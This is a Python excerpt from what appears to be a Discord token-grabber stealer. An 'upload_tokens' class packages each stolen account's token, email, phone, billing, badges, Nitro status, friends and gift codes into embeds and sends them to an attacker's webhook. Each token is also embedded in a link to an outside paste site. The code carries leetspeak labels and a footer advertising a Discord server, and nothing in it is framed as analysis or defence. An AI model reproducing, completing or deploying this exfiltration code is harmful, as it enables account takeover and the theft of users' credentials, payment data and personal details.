...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed = Embed(title=f"{username} ({user_id})", color=0x03CEA4)
            embed.set_thumbnail(url=avatar)

            embed.add_field(name="<a:pinkcrown:996004209667346442> T0K3N:",
                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(
                name="<a:nitroboost:996004213354139658> N1TR0:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:redboost:996004230345281546> B4DG3S:",
                            value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:pinklv:996004222090891366> B1LL1NG:",
            ...
            embed.add_field(name="<a:rainbowheart:996004226092245072> EM4IL:",
                            value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:starxglow:996004217699434496> PH0NE:",
            ...
            if hq_friends != None:
                embed.add_field(
                    name="<a:earthpink:996004236531859588> HQ Fri3nds:", value=hq_friends, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if codes != None:
                embed.add_field(
                    name="<a:gift:1021608479808569435> Gift C0d3s:", value=codes, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(text="discord.gg/linkdaloja")

            self.webhook.send(embed=embed, username="YSL",
                              avatar_url="https://imgur.com/QohxxRI.png")
